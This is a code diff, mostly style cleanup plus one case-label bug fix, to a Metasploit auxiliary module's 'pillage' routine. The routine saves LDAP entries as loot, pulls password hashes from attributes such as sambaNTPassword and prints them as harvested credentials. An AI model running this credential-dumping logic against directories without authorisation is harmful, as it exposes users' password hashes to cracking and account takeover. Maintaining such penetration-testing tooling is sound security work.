@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def pillage(entries)
     # TODO: Make this more efficient?
-    ldif = entries.map(&:to_ldif).map{|s| s.force_encoding('utf-8')}.join("\n")
+    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")
 
     print_status('Storing LDAP data in loot')
 
@@ -125,9 +125,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Saved LDAP data to #{ldif_filename}")
 
-    unless @pass_attr
-      @pass_attr = datastore["PASS_ATTR"]
-    end
+    @pass_attr ||= datastore['PASS_ATTR']
 
     print_status("Searching for attribute: #{@pass_attr}")
     # Process entries with a non-empty userPassword attribute
@@ -150,27 +148,24 @@ class MetasploitModule < Msf::Auxiliary
       service_name: 'ldap'
     }
 
-    unless @user_attr
-      @user_attr = datastore["USER_ATTR"]
-    end
+    @user_attr ||= datastore['USER_ATTR']
 
-    unless @user_attr
-      @user_attr = "dn"
-    end
+    @user_attr ||= 'dn'
 
     print_status("Taking #{@user_attr} attribute as username")
 
     entries.each do |entry|
       # This is the "username"
-      dn = entry[@user_attr].first #.dn
+      dn = entry[@user_attr].first # .dn
 
       hash = entry[@pass_attr].first
 
       # Skip empty hashes '{CRYPT}x'
       if hash.nil? || hash.empty? ||
-          (hash.downcase.start_with?("{crypt}") && hash.length < 10)
+         (hash.downcase.start_with?('{crypt}') && hash.length < 10)
         next
       end
+
       hash.gsub!('{crypt}$1$', '$1$')
 
       print_good("Credentials found: #{dn}:#{hash}")
@@ -178,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
       case @pass_attr.downcase
       when 'sambalmpassword'
         hash_format = 'lm'
-      when 'sambalmpassword'
+      when 'sambantpassword'
         hash_format = 'nt'
       else
         hash_format = identify_hash(hash)
